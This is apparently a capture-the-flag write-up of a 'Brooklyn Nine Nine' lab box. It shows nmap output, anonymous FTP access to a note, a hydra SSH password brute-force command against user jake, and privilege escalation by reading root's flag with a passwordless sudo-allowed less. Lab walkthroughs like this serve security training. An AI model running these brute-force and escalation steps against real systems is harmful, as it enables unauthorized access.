After getting the ip and opening it into the browser it was our first look 

![homepage](homepage.png)

Even after fuzzing at the endpoint http://10.49.129.48/FUZZ Doesn't gave me anything.

Now we gonna do nmap and see what it gives.

```
Nmap scan report for 10.49.129.48
Host is up (0.065s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.246.164
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=4/29%OT=21%CT=1%CU=42302%PV=Y%DS=3%DC=T%G=Y%TM=69F1BB2
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=109%TI=Z%CI=Z%II=I%TS=9)OPS(O1=M4E8ST11NW6%O2=M4E8ST11NW6%O3=M4
OS:E8NNT11NW6%O4=M4E8ST11NW6%O5=M4E8ST11NW6%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW6%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

As we can see the ftp has a file note_to_jake.txt

as get the file with

```
get note_to_jake.txt
```

then cat note_to_jake.txt i got the content

```

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

Meaning we could attack to jake pass.

And there are 3 users amy,jake and holt

First i tried attacking the user jake of ftp but i was not quite suceesful.

then i went to ssh for it with the command 

```
hydra -l jake -P /home/Seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ssh://10.49.129.48
```

After logging in as the user jake in ssh i tried enumurating here and there.

At the directory /home there were 3 directory each named of those 3 users as per our guess above amy jake and holt.

I went into the holt dirctorry. 

and tehre was a  file named user.txt i was able to read it easily but there was a second file that i was not able to read that was nano.save

Now i did sudo -l this gave me 

```


```bash
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
Meaning we could execute usr/bin/less as root now the root flag is left and it is obvius that only root can opne it.

But we can open that file too with this binary cuz it act as root.

so i did /usr/bin/less /root/root.txt

And boom we got the flag.
